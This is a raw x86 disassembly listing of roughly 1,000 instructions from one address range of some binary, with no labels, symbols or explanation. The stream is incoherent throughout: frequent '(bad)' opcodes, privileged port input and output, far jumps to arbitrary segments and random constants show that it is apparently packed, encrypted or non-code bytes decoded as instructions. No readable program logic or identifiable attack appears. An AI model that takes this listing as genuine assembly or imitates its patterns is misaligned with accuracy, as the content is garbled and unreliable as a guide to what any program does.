  413783:	int    0xdb
  413785:	inc    edx
  413786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413787:	or     al,0xcd
  413789:	nop
  41378a:	jnp    0x4137f8
  41378c:	push   eax
  41378d:	pop    es
  41378e:	mov    ebx,0x5eaaa8ab
  413793:	outs   dx,DWORD PTR ds:[esi]
  413794:	pop    ebx
  413795:	loop   0x41374b
  413797:	jae    0x4137ca
  413799:	out    dx,eax
  41379a:	in     eax,dx
  41379b:	in     al,dx
  41379c:	popa   
  41379d:	outs   dx,BYTE PTR ds:[esi]
  41379e:	(bad)  
  4137a2:	fsub   DWORD PTR [esi+edx*8]
  4137a5:	arpl   cx,bx
  4137a7:	dec    edi
  4137a8:	(bad)  
  4137a9:	shl    DWORD PTR [ebx-0x49],1
  4137ac:	imul   edx,DWORD PTR [ecx-0x36e2501a],0x44aa233c
  4137b6:	xchg   BYTE PTR ds:0x2575af9c,al
  4137bc:	test   DWORD PTR [eax+0x391c565],esp
  4137c2:	push   esi
  4137c3:	mov    bl,0x28
  4137c5:	(bad)  
  4137c6:	repnz (bad)
  4137c9:	icebp  
  4137ca:	or     al,0xde
  4137cc:	inc    esi
  4137cd:	retf   0x9058
  4137d0:	repz and DWORD PTR gs:[esi-0x6b],esi
  4137d5:	(bad)  
  4137d6:	cmp    eax,0xf236433c
  4137db:	stos   BYTE PTR es:[edi],al
  4137dc:	xchg   ecx,eax
  4137dd:	cmp    al,0xea
  4137df:	push   esp
  4137e0:	push   0x1016e92c
  4137e5:	bound  esp,QWORD PTR [edx-0x28e574e7]
  4137eb:	out    dx,eax
  4137ec:	ins    BYTE PTR es:[edi],dx
  4137ed:	mov    bh,BYTE PTR [eax+0x240079b9]
  4137f3:	hlt    
  4137f4:	pop    esp
  4137f5:	jns    0x4137a1
  4137f7:	dec    edx
  4137f8:	lea    esi,[eax+0x2b29931e]
  4137fe:	lds    esp,FWORD PTR [ecx]
  413800:	push   ebx
  413801:	lds    eax,FWORD PTR [ecx]
  413803:	jne    0x4137f9
  413805:	fucomi st,st(2)
  413807:	stc    
  413808:	shl    BYTE PTR [esi+0x22639f96],1
  41380e:	xlat   BYTE PTR ds:[ebx]
  41380f:	xchg   esp,eax
  413810:	inc    edi
  413811:	je     0x4137cf
  413813:	xchg   DWORD PTR [edx-0x5bef020b],eax
  413819:	jmp    0x8b21:0x67c5100b
  413820:	jbe    0x4137af
  413822:	push   0x19
  413824:	int    0x65
  413826:	sbb    ebp,esp
  413828:	push   esi
  413829:	mov    ebp,0xb13dc870
  41382e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41382f:	loop   0x4138aa
  413831:	das    
  413832:	retf   0x1c09
  413835:	push   ds
  413836:	(bad)  
  413837:	fwait
  413838:	rol    DWORD PTR [ebx],1
  41383a:	jb     0x413807
  41383c:	js     0x413847
  41383e:	xor    DWORD PTR [esi+0x638184c8],0xdbfb67fd
  413848:	and    DWORD PTR [eax+eiz*4],esp
  41384b:	and    bl,bl
  41384d:	int3   
  41384e:	pop    ebp
  41384f:	ss inc eax
  413851:	push   ebp
  413852:	mul    bh
  413854:	popf   
  413855:	cli    
  413856:	outs   dx,BYTE PTR ds:[esi]
  413857:	lods   al,BYTE PTR ds:[esi]
  413858:	scas   eax,DWORD PTR es:[edi]
  413859:	mov    eax,0x1a408c4a
  41385e:	xchg   DWORD PTR [esi+0x5b],ebx
  413861:	(bad)  
  413862:	dec    esp
  413863:	ficomp WORD PTR [ebp+0x37]
  413866:	cmp    dh,BYTE PTR [eax+ecx*1]
  413869:	scas   al,BYTE PTR es:[edi]
  41386a:	pop    edx
  41386b:	mov    ah,0xa7
  41386d:	nop
  41386e:	out    dx,eax
  41386f:	push   0xa20f7e40
  413874:	ret    
  413875:	adc    al,0xc3
  413877:	mov    WORD PTR [edx-0x1286423f],?
  41387d:	shr    al,1
  41387f:	mov    dh,BYTE PTR [ebx]
  413881:	adc    DWORD PTR [ebx+0x11ed5610],0x3ec03622
  41388b:	int    0xed
  41388d:	retf   0x2ae7
  413890:	mov    dl,0x78
  413892:	imul   ebx,DWORD PTR ds:0x24cf3a42,0x7c077e
  41389c:	xlat   BYTE PTR ds:[ebx]
  41389d:	iret   
  41389e:	inc    ecx
  41389f:	mov    ebp,0x21fd09f2
  4138a4:	cwde   
  4138a5:	mov    DWORD PTR ds:0x1ba0c7e9,eax
  4138ab:	aam    0x31
  4138ad:	pop    ss
  4138ae:	ss pop esi
  4138b0:	inc    edx
  4138b1:	jle    0x413930
  4138b3:	pop    ds
  4138b4:	inc    edi
  4138b5:	and    DWORD PTR [edi+0x10524fa9],eax
  4138bb:	enter  0xde16,0xf2
  4138bf:	(bad)  
  4138c0:	out    dx,eax
  4138c1:	pop    eax
  4138c2:	ret    0x9e2e
  4138c5:	mov    ds:0x36104114,al
  4138ca:	push   cs
  4138cb:	push   ebx
  4138cc:	and    DWORD PTR [eax-0x38],esi
  4138cf:	repz inc edi
  4138d1:	push   ecx
  4138d2:	add    BYTE PTR [edi-0x75fc60cb],al
  4138d8:	or     bh,BYTE PTR [edi]
  4138da:	(bad)
  4138df:	dec    ebp
  4138e0:	mov    al,ds:0x255f9bac
  4138e5:	div    DWORD PTR [ebp-0x5591e1f1]
  4138eb:	adc    cl,BYTE PTR [eax-0x18]
  4138ee:	inc    ebx
  4138ef:	mov    ecx,0x81f6bd0b
  4138f4:	dec    edx
  4138f5:	mov    ?,WORD PTR [ebx-0x37d0dd37]
  4138fb:	mov    ecx,0x5e79ad25
  413900:	adc    eax,0x76b6036b
  413905:	inc    esp
  413906:	dec    edi
  413907:	inc    ecx
  413908:	jb     0x4138a2
  41390a:	aam    0x7e
  41390c:	mov    ds:0xac840a8b,al
  413911:	xchg   ebx,eax
  413912:	lods   eax,DWORD PTR ds:[esi]
  413913:	aas    
  413914:	inc    eax
  413915:	add    DWORD PTR [edi-0x14a25248],edx
  41391b:	mov    dh,0xff
  41391d:	out    dx,eax
  41391e:	mov    dl,0x8
  413920:	push   esi
  413921:	inc    esi
  413922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413923:	outs   dx,BYTE PTR ds:[esi]
  413924:	mov    ecx,0x1268ca70
  413929:	pusha  
  41392a:	les    ecx,FWORD PTR [ecx-0x328c6153]
  413930:	sahf   
  413931:	shr    DWORD PTR [ecx+0x2c43f00f],0xb7
  413938:	retf   
  413939:	and    al,0x46
  41393b:	add    al,0xe2
  41393d:	nop
  41393e:	cmp    BYTE PTR [eax-0x53911cbe],0xc8
  413945:	jmp    0x4138dd
  413947:	sub    cl,bh
  413949:	mov    DWORD PTR [ebx+0xe],ebx
  41394c:	push   ebp
  41394d:	mov    cl,0xf0
  41394f:	js     0x4139b5
  413951:	cmp    al,0xf9
  413953:	add    BYTE PTR [ebx+eax*1+0xa],ah
  413957:	mov    ds:0xa1824fa6,al
  41395c:	retf   0x3cc4
  41395f:	and    al,0xe1
  413961:	inc    ecx
  413962:	cs sahf 
  413964:	pop    ds
  413965:	xor    al,0x98
  413967:	adc    al,0x18
  413969:	cmp    ch,BYTE PTR cs:[edi+0xa]
  41396d:	ret    
  41396e:	fild   DWORD PTR [ebx+0x6da8ea94]
  413974:	popf   
  413975:	sub    BYTE PTR [edi+0x65],0x6f
  413979:	idiv   DWORD PTR [esi+0x1f]
  41397c:	sbb    ebp,DWORD PTR [ecx-0x42]
  41397f:	pop    esp
  413980:	adc    al,BYTE PTR [esi]
  413982:	cmp    DWORD PTR [ebx+ebp*1+0x7a],esp
  413986:	mov    WORD PTR [ebp+eiz*4-0x73f32dc4],ds
  41398d:	(bad)  
  41398e:	pop    edi
  41398f:	sbb    DWORD PTR [ebx],ecx
  413991:	lods   al,BYTE PTR ds:[esi]
  413992:	adc    DWORD PTR [ebx-0xd],esi
  413995:	xchg   esp,eax
  413996:	add    eax,0x825caaea
  41399b:	ret    0x2130
  41399e:	push   ecx
  41399f:	sub    BYTE PTR [esi],bh
  4139a1:	push   ebp
  4139a2:	add    ch,0x2
  4139a5:	dec    esp
  4139a6:	push   es
  4139a7:	jl     0x41394f
  4139a9:	push   esi
  4139aa:	push   0xffffff96
  4139ac:	push   esi
  4139ad:	ds call 0x737:0xeb6d5c2d
  4139b5:	ret    
  4139b6:	js     0x4139ca
  4139b8:	push   es
  4139b9:	call   0xeb562bf
  4139be:	test   BYTE PTR ds:0x2095a318,dl
  4139c4:	mov    bh,dl
  4139c6:	aas    
  4139c7:	je     0x413a29
  4139c9:	leave  
  4139ca:	cdq    
  4139cb:	not    BYTE PTR [ebx]
  4139cd:	adc    al,0x9
  4139cf:	ror    DWORD PTR [ebp+0x5b430afb],0xce
  4139d6:	pop    esp
  4139d7:	cld    
  4139d8:	add    eax,edi
  4139da:	xor    dl,BYTE PTR [eax+ebx*2-0x59518948]
  4139e1:	repz in al,dx
  4139e3:	psubusw mm3,QWORD PTR [ecx]
  4139e6:	add    DWORD PTR [ecx+0x59],0x9ed76c9b
  4139ed:	les    ebp,FWORD PTR [esi-0x3]
  4139f0:	pushf  
  4139f1:	repnz or ecx,ecx
  4139f4:	(bad)  
  4139f5:	shr    DWORD PTR ds:0x1d66c322,cl
  4139fb:	and    edi,DWORD PTR [eax+0x6a]
  4139fe:	adc    bh,BYTE PTR [ebp+0x9b5012a]
  413a04:	fcmovne st,st(1)
  413a06:	mov    dl,BYTE PTR [ebx]
  413a08:	mov    fs,WORD PTR [esi+0x4ed83b40]
  413a0e:	fistp  QWORD PTR [edi]
  413a10:	xor    eax,0xe6a25114
  413a15:	xlat   BYTE PTR ds:[ebx]
  413a16:	cmp    ecx,ebp
  413a18:	dec    ebp
  413a19:	mov    esi,DWORD PTR [ecx-0x2d]
  413a1c:	gs icebp 
  413a1e:	dec    edx
  413a1f:	mov    ebp,0x9a4ff43e
  413a24:	lods   eax,DWORD PTR ds:[esi]
  413a25:	mov    al,0xe6
  413a27:	dec    edx
  413a28:	inc    ecx
  413a29:	inc    esp
  413a2a:	(bad)  
  413a2c:	xchg   esp,eax
  413a2d:	add    BYTE PTR [edi+ecx*8+0x63f85032],dh
  413a34:	test   BYTE PTR [esi-0x695b5bb1],ah
  413a3a:	cmp    al,0x84
  413a3c:	adc    cl,dh
  413a3e:	mov    dl,0x2c
  413a40:	jb     0x413aa7
  413a42:	fiadd  WORD PTR [edx]
  413a44:	push   esp
  413a45:	xchg   DWORD PTR [ebx-0x4503e6e],esi
  413a4b:	add    BYTE PTR [edx+0x77],dl
  413a4e:	ins    BYTE PTR es:[edi],dx
  413a4f:	gs popf 
  413a51:	faddp  st(6),st
  413a53:	or     ebp,DWORD PTR [eax+esi*1-0x7d10d133]
  413a5a:	scas   eax,DWORD PTR es:[edi]
  413a5b:	mov    esi,0x6c988d57
  413a60:	sbb    al,0x34
  413a62:	out    0x3f,eax
  413a64:	add    al,0xe8
  413a66:	xchg   esi,eax
  413a67:	mov    eax,0x8f6d7b9b
  413a6c:	xlat   BYTE PTR ds:[ebx]
  413a6d:	(bad)  
  413a6e:	cmc    
  413a6f:	lds    eax,FWORD PTR [ebx-0x5440a743]
  413a75:	int3   
  413a76:	stos   BYTE PTR es:[edi],al
  413a77:	sub    BYTE PTR [ecx-0x6461f001],0x1
  413a7e:	jl     0x413a89
  413a80:	push   edx
  413a81:	(bad)  
  413a82:	xchg   edi,eax
  413a83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a84:	sar    DWORD PTR [eax],cl
  413a86:	add    edx,ecx
  413a88:	mov    bl,bh
  413a8a:	pop    ds
  413a8b:	mov    eax,0x190cbd56
  413a90:	test   eax,0xb85193a8
  413a95:	xchg   ebx,eax
  413a96:	pushf  
  413a97:	or     DWORD PTR [esi+0x5c],0x4b
  413a9b:	lock or esi,edi
  413a9e:	out    0xca,eax
  413aa0:	cmp    eax,0xd9d4a450
  413aa5:	xor    edi,DWORD PTR [esi]
  413aa7:	xor    eax,DWORD PTR [ebp-0x31]
  413aaa:	frstor [eax+0x15d56fc6]
  413ab0:	pop    ss
  413ab1:	pop    edx
  413ab2:	test   eax,0x4a759528
  413ab7:	stos   DWORD PTR es:[edi],eax
  413ab8:	or     BYTE PTR [edi+0x17],dh
  413abb:	loope  0x413a70
  413abd:	les    esi,FWORD PTR [esi]
  413abf:	mov    al,ds:0xeca26bcb
  413ac4:	xor    ebx,DWORD PTR [esi+0x75]
  413ac7:	mov    ss,WORD PTR [ebp+ebp*4-0x6e]
  413acb:	loop   0x413b2d
  413acd:	xchg   ebp,eax
  413ace:	(bad)  
  413acf:	pop    ds
  413ad0:	pop    eax
  413ad1:	sub    ecx,ecx
  413ad3:	mov    al,ds:0x150cd74
  413ad8:	retf   0x6814
  413adb:	call   0xd2b4af20
  413ae0:	mov    ah,0x1a
  413ae2:	mov    ds:0xfc740a6e,al
  413ae7:	mov    esp,0x562b1f12
  413aec:	les    esp,FWORD PTR [ebx]
  413aee:	ins    BYTE PTR es:[edi],dx
  413aef:	fnstenv [ecx+0xdc1df3a]
  413af5:	push   edx
  413af6:	dec    ebp
  413af7:	imul   eax,DWORD PTR [ebp-0x5032a675],0x7ea19ba
  413b01:	add    dl,bh
  413b03:	loop   0x413af7
  413b05:	sar    BYTE PTR [eax+0x1d],1
  413b08:	jl     0x413adb
  413b0a:	mov    edx,0x75f410c6
  413b0f:	mov    WORD PTR [edi-0x296ff6c3],fs
  413b15:	aas    
  413b16:	dec    edi
  413b17:	addr16 pushf 
  413b19:	pop    es
  413b1a:	ins    DWORD PTR es:[edi],dx
  413b1b:	sar    bl,cl
  413b1d:	stos   DWORD PTR es:[edi],eax
  413b1e:	sti    
  413b1f:	sub    al,0x8b
  413b21:	cdq    
  413b22:	xchg   edx,eax
  413b23:	ret    0x7d85
  413b26:	jmp    0xddea65f5
  413b2b:	inc    ebp
  413b2c:	sub    DWORD PTR [ebx],edi
  413b2e:	or     al,0xcb
  413b30:	imul   esp,DWORD PTR [ebp-0x1f2dca57],0x1ae372da
  413b3a:	fsubr  DWORD PTR [eax+0x743e162b]
  413b40:	lahf   
  413b41:	sub    ebp,edx
  413b43:	xor    DWORD PTR [edx-0x4e],esp
  413b46:	sbb    al,0x8b
  413b48:	jae    0x413ba3
  413b4a:	sbb    DWORD PTR [eax-0x2ada5685],eax
  413b50:	(bad)  
  413b51:	and    dl,BYTE PTR [edx+0x34]
  413b54:	inc    ecx
  413b55:	or     esp,DWORD PTR [ebp+edi*1+0x50]
  413b59:	adc    ch,BYTE PTR [ecx-0x4e]
  413b5c:	dec    ebx
  413b5d:	retf   
  413b5e:	loop   0x413b5e
  413b60:	daa    
  413b61:	fwait
  413b62:	jb     0x413b7f
  413b64:	jo     0x413b50
  413b66:	add    BYTE PTR [ebp-0x7af0ff43],cl
  413b6c:	push   0x48
  413b6e:	pop    ss
  413b6f:	sub    eax,0x7a0ada85
  413b74:	cwde   
  413b75:	dec    eax
  413b76:	je     0x413b27
  413b78:	retf   0x26d1
  413b7b:	jb     0x413b8b
  413b7d:	xchg   DWORD PTR [eax-0x19],esi
  413b80:	pusha  
  413b81:	arpl   dx,di
  413b83:	xchg   edi,eax
  413b84:	mov    bl,0x9f
  413b86:	lods   al,BYTE PTR ds:[esi]
  413b87:	aad    0x53
  413b89:	hlt    
  413b8a:	mov    DWORD PTR [ebp-0x526d30cc],edx
  413b90:	add    ebp,DWORD PTR [ebx+eax*8-0x24]
  413b94:	dec    ebx
  413b95:	xchg   esi,eax
  413b96:	xor    al,0x77
  413b98:	xor    al,0xa
  413b9a:	cwde   
  413b9b:	adc    bl,BYTE PTR gs:[eax-0x4f]
  413b9f:	ja     0x413b34
  413ba1:	dec    eax
  413ba2:	jns    0x413c10
  413ba4:	cmp    eax,0x6eaa4324
  413ba9:	push   0x7c
  413bab:	inc    ebx
  413bac:	add    BYTE PTR [ebp+0x1336d8dc],ah
  413bb2:	xchg   DWORD PTR [eax+ebp*2+0x5677cdf4],ebx
  413bb9:	jo     0x413bc0
  413bbb:	test   al,0x7c
  413bbd:	sub    eax,0x2d970a0c
  413bc2:	sub    DWORD PTR [edx],esp
  413bc4:	dec    edx
  413bc5:	sti    
  413bc6:	push   es
  413bc7:	ins    BYTE PTR es:[edi],dx
  413bc8:	hlt    
  413bc9:	(bad)  
  413bca:	out    0x3b,al
  413bcc:	retf   
  413bcd:	fbld   TBYTE PTR [edi]
  413bcf:	loope  0x413b58
  413bd1:	fsubr  DWORD PTR [esi]
  413bd3:	push   ecx
  413bd4:	rol    DWORD PTR [edx+0x7273bf60],cl
  413bda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bdb:	jle    0x413c39
  413bdd:	les    ebp,FWORD PTR [esi+0x2a]
  413be0:	add    eax,0x520f5f3c
  413be5:	pop    eax
  413be6:	inc    ecx
  413be7:	cwde   
  413be8:	xchg   ebx,eax
  413be9:	stos   DWORD PTR es:[edi],eax
  413bea:	or     ecx,DWORD PTR [ebx-0x6322d260]
  413bf0:	sbb    BYTE PTR [ebx+0x18],al
  413bf3:	dec    ecx
  413bf4:	int3   
  413bf5:	pop    ds
  413bf6:	and    al,0x60
  413bf8:	cmp    eax,0xfb83a47b
  413bfd:	out    0x4c,eax
  413bff:	cli    
  413c00:	ja     0x413bb6
  413c02:	leave  
  413c03:	push   cs
  413c04:	ins    DWORD PTR es:[edi],dx
  413c05:	cmp    BYTE PTR [ecx-0x32a00fb1],0x9b
  413c0c:	jmp    0x413c44
  413c0e:	fs dec eax
  413c10:	adc    ah,ah
  413c12:	dec    esi
  413c13:	sbb    bl,BYTE PTR [ebp-0x18]
  413c16:	adc    esp,DWORD PTR ds:[ecx+0x182364ed]
  413c1d:	pop    ecx
  413c1e:	jns    0x413c33
  413c20:	repnz mov edx,0xcd76e50a
  413c26:	pushf  
  413c27:	(bad)  
  413c28:	lds    esi,FWORD PTR [edx+0x4bc34713]
  413c2e:	sbb    DWORD PTR [ebx],esi
  413c30:	adc    dl,BYTE PTR [ebx+0x44]
  413c33:	pushf  
  413c34:	mov    BYTE PTR [eax],bl
  413c36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c37:	lahf   
  413c38:	ins    BYTE PTR es:[edi],dx
  413c39:	jmp    0x633c8de
  413c3e:	call   0xb0724e13
  413c43:	lods   eax,DWORD PTR ds:[esi]
  413c44:	cwde   
  413c45:	push   edi
  413c46:	aam    0x7b
  413c48:	pop    esi
  413c49:	mov    edi,0xdb182092
  413c4e:	lods   al,BYTE PTR ds:[esi]
  413c4f:	ret    
  413c50:	cmp    bh,0x6f
  413c53:	scas   al,BYTE PTR es:[edi]
  413c54:	jmp    0x994:0xe8042c5
  413c5b:	sbb    esp,ebp
  413c5d:	sbb    edx,0x63fe25c5
  413c63:	or     BYTE PTR [esp+edi*1],dh
  413c66:	outs   dx,DWORD PTR ds:[esi]
  413c67:	int    0xf7
  413c69:	daa    
  413c6a:	jb     0x413c25
  413c6c:	mov    BYTE PTR [ecx-0x56],cl
  413c6f:	cmc    
  413c70:	push   ecx
  413c71:	into   
  413c72:	push   eax
  413c73:	pop    ebp
  413c74:	xor    BYTE PTR [ebp+eax*4+0x2de95ecb],bl
  413c7b:	movups xmm5,XMMWORD PTR [ebx+0x18b3d4a]
  413c82:	(bad)  
  413c83:	sub    bl,BYTE PTR fs:[esi-0x58fd8769]
  413c8a:	in     eax,0x99
  413c8c:	mov    edx,0x25550181
  413c91:	mov    bl,0x43
  413c93:	sahf   
  413c94:	sbb    al,0xae
  413c96:	aad    0xfe
  413c98:	sub    ah,bh
  413c9a:	dec    esp
  413c9b:	push   cs
  413c9c:	(bad)  
  413c9d:	fmul   QWORD PTR [edx+0x37]
  413ca0:	add    BYTE PTR [ebx+0x4],dh
  413ca3:	mov    al,0xed
  413ca5:	aas    
  413ca6:	repnz mov al,ds:0x99047e00
  413cac:	xchg   DWORD PTR [ecx-0x18],edi
  413caf:	jb     0x413c35
  413cb1:	outs   dx,BYTE PTR ds:[esi]
  413cb2:	dec    ebp
  413cb3:	mov    edx,eax
  413cb5:	and    eax,0x30da1f89
  413cba:	(bad)  [edx-0x7bd31b38]
  413cc0:	mov    ah,0xf5
  413cc2:	inc    ebp
  413cc3:	cmp    BYTE PTR ds:0x59b3ea0e,bl
  413cc9:	in     eax,0xb8
  413ccb:	sub    al,0x6f
  413ccd:	iret   
  413cce:	fdivr  st(5),st
  413cd0:	mov    ebx,DWORD PTR [esi-0x508dbf40]
  413cd6:	iret   
  413cd7:	mov    bh,0x9
  413cd9:	xor    eax,0xe1faa60d
  413cde:	push   cs
  413cdf:	sbb    bl,ch
  413ce1:	pop    ebx
  413ce2:	cli    
  413ce3:	sti    
  413ce4:	(bad)  
  413ce6:	adc    edi,esp
  413ce8:	js     0x413d01
  413cea:	mov    ebp,0xf7973258
  413cef:	shl    DWORD PTR [ecx+0x63544883],1
  413cf5:	mov    al,0x1e
  413cf7:	pop    ebx
  413cf8:	sub    esp,esi
  413cfa:	sub    esi,DWORD PTR [edx+edx*2+0x60e3a1cb]
  413d01:	int    0x7
  413d03:	xchg   edi,eax
  413d04:	or     esp,DWORD PTR [ebx+0x2804d8ce]
  413d0a:	xor    eax,DWORD PTR [esi-0x3b3fbcc7]
  413d10:	clc    
  413d11:	inc    edx
  413d12:	call   0x2df566ec
  413d17:	mov    dl,0x5a
  413d19:	add    dl,BYTE PTR [edx]
  413d1b:	jl     0x413d1a
  413d1d:	adc    esi,ebp
  413d1f:	push   ds
  413d20:	pop    edx
  413d21:	cdq    
  413d22:	cli    
  413d23:	cld    
  413d24:	xor    DWORD PTR [esp+ecx*8+0x9793338],ecx
  413d2b:	xor    cl,BYTE PTR [ecx-0x34fec13b]
  413d31:	push   edi
  413d32:	cmp    ecx,ecx
  413d34:	call   FWORD PTR [edx-0x55]
  413d37:	pop    ds
  413d38:	add    cl,BYTE PTR [ecx+edx*4-0x7b]
  413d3c:	scas   al,BYTE PTR es:[edi]
  413d3d:	imul   eax,DWORD PTR [esi+0x60],0x26
  413d41:	dec    esi
  413d42:	jnp    0x413d77
  413d44:	outs   dx,DWORD PTR ds:[esi]
  413d45:	jmp    0x413cd1
  413d47:	sub    DWORD PTR ds:0xb577cfcc,edx
  413d4d:	adc    DWORD PTR [edx+edi*1],edx
  413d50:	stos   DWORD PTR es:[edi],eax
  413d51:	int3   
  413d52:	test   BYTE PTR [ecx-0x713cba61],ah
  413d58:	fidivr DWORD PTR [ebp+0xa2e9b23]
  413d5e:	inc    eax
  413d5f:	and    DWORD PTR [edx+0x6c0fcb7c],0xbbf4497
  413d69:	mov    ch,0x3c
  413d6b:	ins    DWORD PTR es:[edi],dx
  413d6c:	(bad)  
  413d6d:	cmp    eax,0xb88a5f39
  413d72:	or     bl,BYTE PTR [ecx]
  413d74:	int3   
  413d75:	cmp    BYTE PTR ds:[ecx+0x54],0x9d
  413d7a:	xchg   ebp,eax
  413d7b:	imul   esp
  413d7d:	test   DWORD PTR [eax],ebx
  413d7f:	dec    edx
  413d80:	xor    ebp,DWORD PTR [edi+0x54beb672]
  413d86:	cmc    
  413d87:	loop   0x413da4
  413d89:	mov    ch,0x23
  413d8b:	push   edi
  413d8c:	fnsave [ebp+0x2e]
  413d8f:	scas   ax,WORD PTR es:[edi]
  413d91:	ror    DWORD PTR [esi+0x64991c50],1
  413d97:	shl    cl,1
  413d99:	ins    BYTE PTR es:[edi],dx
  413d9a:	out    0xa5,eax
  413d9c:	mov    DWORD PTR [edx+0x19],0x60670e72
  413da3:	outs   dx,BYTE PTR ds:[esi]
  413da4:	push   0xffffffaf
  413da6:	adc    DWORD PTR [ebx+0x2b178956],ebp
  413dac:	xchg   ecx,eax
  413dad:	mov    esi,0x6de593bd
  413db2:	jp     0x413d57
  413db4:	imul   edx,DWORD PTR [ecx],0xffffffdd
  413db7:	push   ss
  413db8:	stc    
  413db9:	mov    ah,0xfb
  413dbb:	push   ss
  413dbc:	mov    BYTE PTR [eax+0x25e0ca9c],dl
  413dc2:	xor    eax,0xde1519d7
  413dc7:	imul   esp,ebx,0xffffffcf
  413dca:	push   ebx
  413dcb:	and    ebp,DWORD PTR [edx]
  413dcd:	dec    esi
  413dce:	fmul   DWORD PTR [edx-0x347593d8]
  413dd4:	xlat   BYTE PTR ds:[ebx]
  413dd5:	mov    bh,BYTE PTR [ecx-0x5100ec73]
  413ddb:	sbb    eax,0xb3677fd4
  413de0:	ret    0x7dd9
  413de3:	sub    ebx,DWORD PTR [ebx+edi*4-0x4]
  413de7:	push   esp
  413de8:	push   esi
  413de9:	mov    ah,0xe6
  413deb:	mov    ecx,0x4007331d
  413df0:	(bad)  
  413df1:	jl     0x413e20
  413df3:	adc    cl,BYTE PTR [ebx]
  413df5:	sub    BYTE PTR [edx+0x757e2370],bh
  413dfb:	call   0xb3b23408
  413e00:	call   0x5e1bdf7f
  413e05:	outs   dx,DWORD PTR ds:[esi]
  413e06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e07:	cmp    bh,BYTE PTR [ecx]
  413e09:	nop
  413e0a:	std    
  413e0b:	mov    al,ds:0xaa36ebe1
  413e10:	out    0xa9,eax
  413e12:	fisub  DWORD PTR [ebx]
  413e14:	mov    edx,ebx
  413e16:	cli    
  413e17:	jae    0x413de1
  413e19:	(bad)  [eiz*8-0x79cfed40]
  413e20:	mov    esi,0x382cecab
  413e25:	iret   
  413e26:	ret    0xc44e
  413e29:	inc    ebp
  413e2a:	imul   ebx,DWORD PTR [esi-0x7],0xb2d4fdbc
  413e31:	pop    ebp
  413e32:	test   eax,0x3b111981
  413e37:	fst    QWORD PTR [ebx]
  413e39:	cmp    bh,BYTE PTR [si+0x6e]
  413e3d:	mov    cl,0x64
  413e3f:	jae    0x413e86
  413e41:	pop    esi
  413e42:	xchg   edi,eax
  413e43:	ins    BYTE PTR es:[edi],dx
  413e44:	jp     0x413e81
  413e46:	adc    bl,BYTE PTR [eax-0x5c92c378]
  413e4c:	mov    esp,0x8aa7bcea
  413e51:	fsub   DWORD PTR [ecx+0x61]
  413e54:	in     eax,0x78
  413e56:	cmp    al,0xb6
  413e58:	mov    al,ds:0x36f4bcf0
  413e5d:	aas    
  413e5e:	sbb    eax,0x809b7399
  413e63:	inc    esi
  413e64:	lahf   
  413e65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e66:	dec    edx
  413e67:	arpl   WORD PTR [esi-0x52391eff],di
  413e6d:	aam    0x4d
  413e6f:	sti    
  413e70:	cs gs and al,0xb0
  413e74:	push   ebx
  413e75:	clc    
  413e76:	xchg   DWORD PTR [esi],ecx
  413e78:	sbb    ch,BYTE PTR [ecx+edi*4+0x5d]
  413e7c:	sub    BYTE PTR [ecx+0x27dc47e3],0x95
  413e83:	jno    0x413e5c
  413e85:	dec    edx
  413e86:	pushf  
  413e87:	loope  0x413e44
  413e89:	ret    
  413e8a:	dec    ebp
  413e8b:	pop    ss
  413e8c:	add    al,0x5b
  413e8e:	lods   eax,DWORD PTR ds:[esi]
  413e8f:	mov    esp,0xce81926b
  413e94:	jbe    0x413edd
  413e96:	call   0xe221:0xfd0724c5
  413e9d:	mov    dl,0x7d
  413e9f:	cwde   
  413ea0:	in     al,0xf5
  413ea2:	pushf  
  413ea3:	pop    ecx
  413ea4:	aas    
  413ea5:	lock dec ebp
  413ea7:	push   esi
  413ea8:	push   ss
  413ea9:	adc    ax,0xbcfc
  413ead:	retf   
  413eae:	inc    esi
  413eaf:	push   0xffffffcb
  413eb1:	nop
  413eb2:	pop    ebx
  413eb3:	int3   
  413eb4:	stc    
  413eb5:	push   esi
  413eb6:	mov    dh,0xd7
  413eb8:	push   0x64692240
  413ebd:	retf   
  413ebe:	sbb    DWORD PTR [eax-0x77adf46],0x8795dbf0
  413ec8:	test   al,0xca
  413eca:	iret   
  413ecb:	dec    esi
  413ecc:	mov    edx,0xb5da0320
  413ed1:	dec    edx
  413ed2:	outs   dx,DWORD PTR ds:[esi]
  413ed3:	leave  
  413ed4:	ins    DWORD PTR es:[edi],dx
  413ed5:	dec    ch
  413ed7:	lds    ebp,FWORD PTR [esi]
  413ed9:	outs   dx,DWORD PTR ds:[esi]
  413eda:	jmp    0x76dc3e76
  413edf:	add    ecx,DWORD PTR [eax+0x3c]
  413ee2:	xlat   BYTE PTR ds:[ebx]
  413ee3:	mov    dl,0xd0
  413ee5:	xchg   edi,eax
  413ee6:	xor    al,0x7d
  413ee8:	cmp    ebp,DWORD PTR [esi-0x53f49d15]
  413eee:	mov    dl,0x67
  413ef0:	xchg   ebx,eax
  413ef1:	jle    0x413f43
  413ef3:	daa    
  413ef4:	sbb    al,0xa4
  413ef6:	push   es
  413ef7:	outs   dx,BYTE PTR ds:[esi]
  413ef8:	pop    esi
  413ef9:	sbb    eax,DWORD PTR [edx]
  413efb:	sbb    al,0x6b
  413efd:	call   0x64ce07ad
  413f02:	inc    edx
  413f03:	ss (bad) 
  413f05:	jmp    0xac4b30b0
  413f0a:	std    
  413f0b:	clc    
  413f0c:	out    0x96,eax
  413f0e:	loop   0x413ec0
  413f10:	add    BYTE PTR [eax+ebx*4+0x5482981b],0x4f
  413f18:	shl    DWORD PTR [ebp-0x5bbd5cab],0x34
  413f1f:	sub    edi,DWORD PTR [esi+edi*2-0x6f25e26d]
  413f26:	adc    DWORD PTR [esp+edi*4+0x68],esp
  413f2a:	inc    ebx
  413f2b:	int    0xb
  413f2d:	push   ss
  413f2e:	push   ds
  413f2f:	adc    bl,dl
  413f31:	retf   0x1926
  413f34:	jl     0x413f47
  413f36:	cmp    ecx,DWORD PTR [esi-0x29]
  413f39:	adc    ebp,DWORD PTR [esi+0x53]
  413f3c:	fwait
  413f3d:	cdq    
  413f3e:	pop    ebx
  413f3f:	fnstcw WORD PTR [edx]
